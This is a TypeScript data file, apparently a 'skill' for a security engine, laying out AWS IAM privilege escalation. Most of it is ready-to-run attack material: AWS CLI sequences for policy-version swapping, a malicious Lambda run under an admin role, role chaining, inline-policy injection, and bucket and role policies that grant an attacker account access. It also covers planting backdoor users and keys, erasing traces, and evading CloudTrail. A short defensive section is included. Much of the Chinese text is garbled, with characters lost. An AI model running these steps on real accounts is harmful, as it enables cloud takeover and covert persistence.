/**
 * HOS-Sec-Engine V2 - IAM Privilege Escalation Techniques
 * IAM 权限提升专项 Skill
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const iamPrivilegeEscalationSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'cloud-iam-001',
            name: 'IAM Privilege Escalation Techniques',
            category: 'cloud',
            subCategory: 'iam',
            riskLevel: 'critical',
            confidence: 0.93,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: [
                'iam',
                'privilege-escalation',
                'iam-passrole',
                'create-policy-version',
                'assume-role',
                'lambda-role',
                'credential-abuse',
                'resource-based-policy',
                'aws',
                'iam-policy',
                'sts',
                'role-chain',
                'policy-injection',
            ],
        },
        trigger: {
            scenarios: [
                '已获?AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权',
                '目标 IAM 用户附加了多?managed policy ?inline policy，可能存在权限重叠或遗漏',
                '发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限',
                '目标 IAM policy 允许 iam:CreatePolicyVersion 且未限制 set-as-default',
                '存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻',
                'Lambda 函数配置了高权限执行角色，可通过修改函数代码以该角色执行',
                '发现 IAM 凭证泄露（GitHub 泄露、配置文件泄露、日志泄露）',
                '资源基础策略（Resource-based Policy）中存在宽松?Principal 配置',
            ],
            keywords: [
                'iam',
                'privilege escalation',
                '权限提升',
                'passrole',
                'assume-role',
                'create-policy-version',
                'lambda role',
                'credential',
                'access key',
                'managed policy',
                'inline policy',
                'sts',
                'role chain',
                'resource policy',
                'iam policy',
                'admin access',
                'administratoraccess',
            ],
            aliases: [
                'iam escalation',
                'role hijacking',
                'policy abuse',
                'iam takeover',
                'credential escalation',
                'cross-account escalation',
                'iam misconfiguration',
                'lambda privilege escalation',
            ],
            indicators: [
                'IAM 用户权限中包?iam:* ?iam:CreatePolicyVersion',
                '用户权限中包?iam:PassRole 和特定服务创建权限（?lambda:CreateFunction',
                '用户权限中包?sts:AssumeRole 且目标角色权限更',
                '用户权限中包?iam:PutUserPolicy ?iam:AttachUserPolicy',
                'Lambda 函数执行角色包含 AdministratorAccess 或高权限策略',
                '发现 AccessKey 但权限有限，需进一步探测可用权?',
            ],
        },
        knowledge: {
            description: 'AWS IAM 权限提升是云渗透测试中的核心技能。当攻击者获取了低权?IAM 凭证后，通过分析和利?IAM 策略配置错误，可以提升到管理员权限。Rhino Security Labs 定义?30+ ?IAM 权限提升路径（参?https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/）。最常见的路径包括：(1) iam:CreatePolicyVersion ?创建新版本策略并设为默认?2) iam:PassRole + 服务创建权限 ?通过 Lambda、EC2、Glue 等服务以高权限角色执行代码；(3) sts:AssumeRole ?担任权限更高的角色；(4) iam:PutUserPolicy/AttachUserPolicy ?直接修改自己的策略。此外，资源基础策略（如 S3 bucket policy、SQS queue policy、Lambda resource policy）中的宽?Principal 配置也可被利用。权限提升的关键在于枚举当前凭证的有效权限（iam:GetUser、iam:ListAttachedUserPolicies、iam:SimulatePrincipalPolicy），然后找到可提权的路径',
            symptoms: [
                'IAM 用户附加了多?managed policy，其中至少一个包?iam: 权限',
                '用户?iam:CreatePolicyVersion 权限但策略文档中缺少限制条件',
                '用户?iam:PassRole 权限且能列出高权?IAM 角色',
                '用户?sts:AssumeRole 权限且信任策略未限制 source account',
                'Lambda 函数的执行角色包?AdministratorAccess 或敏感权',
                'S3 bucket policy ?SQS queue policy ?Principal ?"*" 或包含攻击者账',
                '用户?iam:UpdateLoginProfile 权限，可修改其他用户的密?',
            ],
            rootCauses: [
                '管理员使用通配符权限（?"Action": "iam:*"）而非最小权限原',
                '策略中缺?Condition 限制，允许无约束?iam:CreatePolicyVersion',
                'iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*"',
                'sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume',
                'Lambda 函数创建时使用了高权限角色，且函数代码用户可',
                '资源基础策略未正确验?Principal，导致跨账户权限泄露',
                'IAM policy 版本管理：CreatePolicyVersion 最多允?5 个版本，攻击者可创建新版本覆盖原有策',
                'Service Control Policies (SCP) 未正确配置，无法阻止权限提升操作',
            ],
            observations: [
                '使用 iam:GetUser、iam:ListAttachedUserPolicies、iam:ListUserPolicies 枚举当前权限',
                'iam:SimulatePrincipalPolicy 可模拟测试权限，但需?iam:SimulatePrincipalPolicy 权限本身',
                '使用 Pacu (https://github.com/RhinoSecurityLabs/pacu) 自动化检测和利用 IAM 权限提升路径',
                'AWS Organizations ?SCP 可以在组织级别阻止某些操作，即使 IAM policy 允许',
                'Permissions Boundary 可以限制 IAM 实体能获得的最大权限，即使策略更宽',
                'Lambda 函数代码可以通过环境变量或层（Layers）注入恶意代',
                '某些服务（如 Glue、DataPipeline、SageMaker）允许执行自定义代码，结?PassRole 可提',
                '跨账?AssumeRole 链：Account A ?Account B ?Account A (Admin)，形成角色链提升',
            ],
            commonMistakes: [
                '未检?Permissions Boundary ?SCP，导致提权路径实际不可用',
                '只关?managed policy，忽略了 inline policy 可能包含额外权限',
                '未考虑资源基础策略（bucket policy、role trust policy）可能放宽权',
                '假设 iam:PassRole 权限足够，但未验证是否能创建使用该角色的服务',
                '未考虑 MFA 要求，某些角?require MFA 但攻击者没',
                '忽略了策略中?Condition 字段（如 aws:RequestedRegion、aws:SourceIp',
                '只尝试了标准的提权路径，未组合多个低权限操作达到提权效果',
            ],
            notes: [
                'IAM 权限提升的核心思路：枚??分析 ?利用 ?验证',
                '使用 aws sts get-caller-identity 确认当前身份和账?ID',
                '使用 iam simulating policy 工具可离线分析策略文件中的潜在提权路',
                '某些提权路径可能需要多个步骤组合，?iam:CreatePolicyVersion + iam:AttachUserPolicy',
                '提权后应立即创建后门（持久化访问），因为原凭证可能随时被轮换',
                'AWS CloudTrail 会记录所?IAM 操作，提权操作极易被检测，需注意隐蔽?',
            ],
        },
        action: {
            checklist: [
                '使用 sts:get-caller-identity 确认当前身份、账?ID ?ARN',
                '枚举当前用户权限：iam:list-attached-user-policies、iam:list-user-policies',
                '获取每个策略的详细内容：iam:get-policy-version',
                '使用 iam:simulate-principal-policy 测试潜在提权权限',
                '检查是否有 iam:CreatePolicyVersion + set-as-default 的提权路',
                '检查是否有 iam:PassRole 权限，并枚举可用的高权限角色',
                '检查是否有 sts:AssumeRole 权限，并分析目标角色的信任策',
                '检查是否有 iam:PutUserPolicy/AttachUserPolicy 权限直接提权',
                '检?Lambda 函数执行角色权限，评?Lambda 提权路径',
                '检查资源基础策略（S3 bucket policy、SQS policy、Lambda policy',
                '使用 Pacu 自动化检测和利用所有可用提权路',
                '提权后验证新权限：aws sts get-caller-identity、aws iam list-users',
            ],
            techniques: [
                'iam:CreatePolicyVersion ?创建策略新版本并设为默认，直接修改策略权',
                'iam:PassRole + lambda:CreateFunction ?创建 Lambda 函数以高权限角色执行代码',
                'iam:PassRole + ec2:RunInstances ?创建 EC2 实例以高权限角色执行命令',
                'iam:PassRole + glue:CreateJob ?创建 Glue Job 以高权限角色执行代码',
                'sts:AssumeRole ?直接担任更高权限的角',
                'iam:PutUserPolicy ?添加 inline policy 到当前用',
                'iam:AttachUserPolicy ?附加 managed policy 到当前用',
                'iam:UpdateLoginProfile ?修改其他用户的控制台密码',
                'iam:CreateAccessKey ?为高权限用户创建新的 AccessKey',
                'iam:AddUserToGroup ?将当前用户加入高权限',
                '资源基础策略注入 ?修改 S3 bucket policy ?Lambda resource policy 放宽权限',
                '角色链提??通过多个账户间的 AssumeRole 形成角色',
                'Lambda Layer 注入 ?创建包含恶意代码?Lambda Layer 并附加到目标函数',
            ],
            examples: [
                {
                    name: 'iam:CreatePolicyVersion 权限提升',
                    description: '利用 iam:CreatePolicyVersion 创建新策略版本并设为默认，将当前用户策略修改为管理员权限',
                    content: '# 1. 确认当前用户?CreatePolicyVersion 权限\n' +
                        'aws sts get-caller-identity\n' +
                        'aws iam list-attached-user-policies --user-name current-user\n\n' +
                        '# 2. 获取当前策略?ARN（假设为 arn:aws:iam::123456789012:policy/MyPolicy）\n' +
                        'aws iam get-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --version-id v1\n\n' +
                        '# 3. 创建新的策略版本（管理员权限）\n' +
                        'aws iam create-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Action": "*",\n' +
                        '      "Resource": "*"\n' +
                        '    }]\n' +
                        '  }\' \\\n' +
                        '  --set-as-default\n\n' +
                        '# 4. 验证新权限已生效\n' +
                        'aws iam list-users\n' +
                        'aws s3 ls\n\n' +
                        '# 注意：每个策略最?5 个版本，可能需要先删除旧版本\n' +
                        'aws iam delete-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n' +
                        '  --version-id v1',
                },
                {
                    name: 'iam:PassRole + Lambda 函数权限提升',
                    description: '利用 iam:PassRole ?lambda:CreateFunction 权限，创建以高权限角色执行的 Lambda 函数',
                    content: '# 1. 枚举可用?IAM 角色\n' +
                        'aws iam list-roles --query "Roles[].{ARN:Arn,Name:RoleName}" --output table\n\n' +
                        '# 2. 检查目标角色的权限（假设为 AdminRole）\n' +
                        'aws iam list-attached-role-policies --role-name AdminRole\n' +
                        'aws iam get-policy-version \\\n' +
                        '  --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy \\\n' +
                        '  --version-id v1\n\n' +
                        '# 3. 确认当前用户?PassRole 权限\n' +
                        'aws iam simulate-principal-policy \\\n' +
                        '  --policy-source-arn arn:aws:iam::123456789012:user/current-user \\\n' +
                        '  --action-names iam:PassRole \\\n' +
                        '  --resource-arns arn:aws:iam::123456789012:role/AdminRole\n\n' +
                        '# 4. 创建恶意 Lambda 函数代码\n' +
                        'cat > exploit.py << \'PYEOF\'\n' +
                        'import boto3, json\n' +
                        'def lambda_handler(event, context):\n' +
                        '    client = boto3.client("iam")\n' +
                        '    # 创建新的管理员策略\n' +
                        '    client.create_policy(\n' +
                        '        PolicyName="BackdoorPolicy",\n' +
                        '        PolicyDocument=json.dumps({\n' +
                        '            "Version": "2012-10-17",\n' +
                        '            "Statement": [{\n' +
                        '                "Effect": "Allow",\n' +
                        '                "Action": "*",\n' +
                        '                "Resource": "*"\n' +
                        '            }]\n' +
                        '        })\n' +
                        '    )\n' +
                        '    return {"status": "done"}\n' +
                        'PYEOF\n\n' +
                        'zip exploit.zip exploit.py\n\n' +
                        '# 5. 创建 Lambda 函数（使?AdminRole）\n' +
                        'aws lambda create-function \\\n' +
                        '  --function-name escalate \\\n' +
                        '  --runtime python3.9 \\\n' +
                        '  --role arn:aws:iam::123456789012:role/AdminRole \\\n' +
                        '  --handler exploit.lambda_handler \\\n' +
                        '  --zip-file fileb://exploit.zip\n\n' +
                        '# 6. 触发函数执行\n' +
                        'aws lambda invoke --function-name escalate response.json\n\n' +
                        '# 7. 清理痕迹\n' +
                        'aws lambda delete-function --function-name escalate\n' +
                        'rm exploit.py exploit.zip',
                },
                {
                    name: 'sts:AssumeRole 角色链提',
                    description: '通过 sts:AssumeRole 担任更高权限的角色，可能涉及多账户角色链',
                    content: '# 1. 发现可用的角色和信任关系\n' +
                        'aws iam list-roles --query "Roles[].{ARN:Arn,TrustPolicy:AssumeRolePolicyDocument}" \\\n' +
                        '  --output json | jq \'.[] | select(.TrustPolicy.Statement[].Principal.AWS | contains("123456789012"))\'\n\n' +
                        '# 2. 检查目标角色的信任策略\n' +
                        'aws iam get-role --role-name TargetRole --query "Role.AssumeRolePolicyDocument"\n\n' +
                        '# 3. 如果信任策略包含当前账户或用户，执行 AssumeRole\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/TargetRole \\\n' +
                        '  --role-session-name escalation-session\n\n' +
                        '# 4. 获取临时凭证\n' +
                        '# 返回: {AccessKeyId, SecretAccessKey, SessionToken}\n\n' +
                        '# 5. 使用临时凭证\n' +
                        'export AWS_ACCESS_KEY_ID={AccessKeyId}\n' +
                        'export AWS_SECRET_ACCESS_KEY={SecretAccessKey}\n' +
                        'export AWS_SESSION_TOKEN={SessionToken}\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 6. 跨账户角色链\n' +
                        '# Account A (当前) ?AssumeRole ?Account B (中间) ?AssumeRole ?Account A (管理?\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::999999999999:role/CrossAccountRole \\\n' +
                        '  --role-session-name chain-1\n\n' +
                        '# 使用 Account B 的凭证继续\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/AdminRole \\\n' +
                        '  --role-session-name chain-2\n\n' +
                        '# 7. 注意检查角色是否要?MFA\n' +
                        '# 如果 trust policy 中有 "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}\n' +
                        '# 则需?MFA token 才能 assume',
                },
                {
                    name: 'iam:PutUserPolicy 直接策略注入',
                    description: '利用 iam:PutUserPolicy ?iam:AttachUserPolicy 直接向当前用户添加管理员策略',
                    content: '# 1. 确认当前用户?PutUserPolicy 权限\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 2. 使用 PutUserPolicy 添加 inline policy\n' +
                        'aws iam put-user-policy \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \\\n' +
                        '  --policy-name escalation-policy \\\n' +
                        '  --policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Action": "*",\n' +
                        '      "Resource": "*"\n' +
                        '    }]\n' +
                        '  }\'\n\n' +
                        '# 3. 或使?AttachUserPolicy 附加 managed policy\n' +
                        'aws iam attach-user-policy \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2) \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n' +
                        '# 4. 验证权限已生效\n' +
                        'aws iam list-users\n' +
                        'aws ec2 describe-instances\n\n' +
                        '# 5. 持久化：创建新的 AccessKey\n' +
                        'aws iam create-access-key \\\n' +
                        '  --user-name $(aws sts get-caller-identity --query "Arn" --output text | cut -d/ -f2)\n\n' +
                        '# 6. 或为 root 账户创建 AccessKey（如果可能）\n' +
                        'aws iam create-access-key --user-name root',
                },
                {
                    name: '资源基础策略（Resource-based Policy）利',
                    description: '利用 S3 bucket policy、SQS queue policy ?Lambda resource policy 中的宽松配置获取权限',
                    content: '# 1. 检?S3 bucket policy 中是否有宽松 Principal\n' +
                        'aws s3api get-bucket-policy --bucket target-bucket --output text | jq\n\n' +
                        '# 2. 如果 bucket policy 允许 PutBucketPolicy，注入新策略\n' +
                        'aws s3api put-bucket-policy --bucket target-bucket --policy \'{\n' +
                        '  "Version": "2012-10-17",\n' +
                        '  "Statement": [{\n' +
                        '    "Sid": "Backdoor",\n' +
                        '    "Effect": "Allow",\n' +
                        '    "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},\n' +
                        '    "Action": "s3:*",\n' +
                        '    "Resource": ["arn:aws:s3:::target-bucket", "arn:aws:s3:::target-bucket/*"]\n' +
                        '  }]\n' +
                        '\'}\'\n\n' +
                        '# 3. 检?SQS queue policy\n' +
                        'aws sqs get-queue-attributes \\\n' +
                        '  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/my-queue \\\n' +
                        '  --attribute-names Policy\n\n' +
                        '# 4. 检?Lambda resource policy\n' +
                        'aws lambda get-policy --function-name target-function\n\n' +
                        '# 5. 如果 Lambda resource policy 允许 lambda:InvokeFunction\n' +
                        '# 可调用目标函数，可能触发敏感操作\n' +
                        'aws lambda invoke \\\n' +
                        '  --function-name target-function \\\n' +
                        '  --payload \'{"action": "admin"}\' \\\n' +
                        '  response.json\n\n' +
                        '# 6. 利用 IAM Role Trust Policy\n' +
                        '# 如果角色信任策略?Principal 为任意账户（未限?ExternalId）\n' +
                        '# 可从外部账户 assume 该角色\n' +
                        'aws sts assume-role \\\n' +
                        '  --role-arn arn:aws:iam::123456789012:role/VulnerableRole \\\n' +
                        '  --role-session-name cross-account-attack',
                },
                {
                    name: 'IAM 凭证滥用与持久化',
                    description: '利用已获取的 IAM 凭证进行权限探测、横向移动和持久化访',
                    content: '# 1. 确认当前身份和权限范围\n' +
                        'aws sts get-caller-identity\n\n' +
                        '# 2. 枚举所?IAM 用户和角色\n' +
                        'aws iam list-users --query "Users[].{Name:UserName,ARN:Arn}"\n' +
                        'aws iam list-roles --query "Roles[].{Name:RoleName,ARN:Arn}"\n\n' +
                        '# 3. 枚举所有策略\n' +
                        'aws iam list-policies --scope Local --query "Policies[].Arn"\n\n' +
                        '# 4. 检?EC2 实例配置文件（可能包含高权限角色）\n' +
                        'aws ec2 describe-instances --query "Reservations[].Instances[].IamInstanceProfile"\n\n' +
                        '# 5. 检查是否存?Lambda 函数可修改\n' +
                        'aws lambda list-functions --query "Functions[].{Name:FunctionName,Role:Role}"\n\n' +
                        '# 6. 持久化方?1：创建新?IAM 用户\n' +
                        'aws iam create-user --user-name backdoor-user\n' +
                        'aws iam attach-user-policy \\\n' +
                        '  --user-name backdoor-user \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' +
                        'aws iam create-access-key --user-name backdoor-user\n\n' +
                        '# 7. 持久化方?2：修改现有用户的策略\n' +
                        'aws iam put-user-policy \\\n' +
                        '  --user-name admin-user \\\n' +
                        '  --policy-name backdoor \\\n' +
                        '  --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'\n\n' +
                        '# 8. 持久化方?3：创?IAM 角色\n' +
                        'aws iam create-role \\\n' +
                        '  --role-name backdoor-role \\\n' +
                        '  --assume-role-policy-document \'{\n' +
                        '    "Version": "2012-10-17",\n' +
                        '    "Statement": [{\n' +
                        '      "Effect": "Allow",\n' +
                        '      "Principal": {"AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"},\n' +
                        '      "Action": "sts:AssumeRole"\n' +
                        '    }]\n' +
                        '  }\'\n' +
                        'aws iam attach-role-policy \\\n' +
                        '  --role-name backdoor-role \\\n' +
                        '  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
                },
                {
                    name: '使用 Pacu 自动?IAM 权限提升',
                    description: '使用 Pacu 框架自动化检测和利用 IAM 权限提升路径',
                    content: '# 1. 安装 Pacu\n' +
                        'pip install pacu\n' +
                        'pacu\n\n' +
                        '# 2. 配置已获取的凭证\n' +
                        'Pacu (my_session) > set_keys\n' +
                        'Please input an Access Key ID: AKIAxxxxxxxxxxxx\n' +
                        'Please input a Secret Access Key: xxxxxxxxxxxxxxxxxxxxxx\n' +
                        'Please input a Session Token (optional): xxxxxxx\n' +
                        'Please input a region (optional, default: us-east-1):\n\n' +
                        '# 3. 枚举当前权限\n' +
                        'Pacu (my_session) > run iam__enum_permissions\n' +
                        '# 输出当前用户的所有权限列表\n\n' +
                        '# 4. 检测权限提升路径\n' +
                        'Pacu (my_session) > run iam__privesc_scan\n' +
                        '# 自动检测所有可用的提权路径并列出利用方法\n\n' +
                        '# 5. 执行提权\n' +
                        'Pacu (my_session) > run iam__privesc_scan --privesc\n' +
                        '# 自动执行检测到的提权路径\n\n' +
                        '# 6. 查看可用模块\n' +
                        'Pacu (my_session) > ls\n' +
                        '# 常用模块:\n' +
                        '#   iam__enum_users - 枚举 IAM 用户\n' +
                        '#   iam__enum_roles - 枚举 IAM 角色\n' +
                        '#   iam__backdoor_assume_role - 在角色中创建后门\n' +
                        '#   lambda__backdoor_new_roles - 为新角色添加后门策略\n' +
                        '#   ec2__startup_shell_script - 通过 EC2 user-data 执行命令\n\n' +
                        '# 7. 导出结果\n' +
                        'Pacu (my_session) > export_creds\n' +
                        '# 导出提权后获取的所有凭?',
                },
            ],
        },
        validation: {
            indicators: [
                'CreatePolicyVersion 返回成功?set-as-default 生效',
                'Lambda 函数创建成功并能以目标角色执',
                'sts:AssumeRole 返回临时凭证（AccessKeyId、SecretAccessKey、SessionToken',
                'PutUserPolicy 返回成功，当前用户策略已更新',
                '资源基础策略修改成功，跨账户访问生效',
                'Pacu iam__privesc_scan 检测到可用提权路径',
            ],
            successSigns: [
                '成功获取 AdministratorAccess 或等效高权限',
                '能够列出所?IAM 用户和角色（之前无法访问',
                '能够创建/删除 IAM 实体（用户、角色、策略）',
                '能够访问 S3、EC2 等其?AWS 服务的所有资',
                'sts:get-caller-identity 显示已切换到高权限角',
                '临时凭证在有效期内且权限正确',
            ],
            falsePositiveSigns: [
                '权限包含 iam:CreatePolicyVersion 但策略有 Condition 限制（如 ip-address 条件',
                'iam:PassRole 权限存在但目标角?trust policy 不允许当前用?assume',
                'sts:AssumeRole 需?MFA 但当前凭证未启用 MFA',
                'Permissions Boundary 限制了策略能授予的最大权限范',
                'SCP（Service Control Policy）在组织级别阻止了提权操',
                '角色?maximum session duration 限制，临时凭证有效期?',
            ],
        },
        defense: {
            recommendations: [
                '遵循最小权限原则，禁止使用 "Action": "*" ?"iam:*" 通配符策',
                '?iam:CreatePolicyVersion 添加 Condition 限制（如要求 MFA、限制特?IP',
                '严格限制 iam:PassRole 权限：指定具体角?ARN 和服务，禁止 "Resource": "*"',
                '在角色信任策略中使用 ExternalId 防止 confused deputy 攻击',
                '启用 AWS Organizations SCP 在组织级别阻止危?IAM 操作',
                '为所?IAM 实体设置 Permissions Boundary，限制最大权限范',
                '定期审查 IAM 策略，使?IAM Access Analyzer 检测过度授',
                '启用 CloudTrail 对所?IAM 操作进行日志记录和告',
                '对敏感角色启?MFA 要求?Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}',
                '使用 AWS IAM credential report 定期检查未使用的凭',
                '实施 IAM policy 版本管理审计，监控策略版本变',
                '限制 sts:AssumeRole 的信任策略，明确指定允许?Principal ?Condition',
            ],
            mitigations: [
                '立即轮换所有可能泄露的 IAM 凭证',
                '删除或禁用可疑的 IAM 用户和角',
                '审查 CloudTrail 日志，识别提权操作的时间线和影响范围',
                '恢复被修改的 IAM 策略到安全版',
                '启用 MFA Delete 防止策略被意外或恶意修改',
                '对受影响的服务启?VPC 端点策略限制访问',
                '使用 AWS Config 规则持续监控 IAM 配置合规',
                '如果检测到攻击者创建了后门角色/用户，立即删除并审计关联操作',
            ],
            references: [
                'https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_delegate-permissions.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html',
                'https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer.html',
                'https://github.com/RhinoSecurityLabs/pacu',
                'https://awslabs.github.io/prowler/',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html',
            ],
        },
        quality: {
            confidence: 0.93,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        enabled: true,
    },
];
